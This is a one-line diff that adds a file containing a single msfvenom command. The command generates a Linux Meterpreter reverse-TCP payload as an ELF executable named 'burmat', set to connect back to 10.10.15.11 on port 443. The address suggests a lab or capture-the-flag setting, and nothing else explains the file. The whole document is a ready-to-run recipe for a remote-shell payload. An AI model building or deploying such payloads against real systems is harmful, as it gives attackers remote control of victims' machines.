@@ -1,0 +1,1 @@
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.11 LPORT=443 -f elf -o burmat
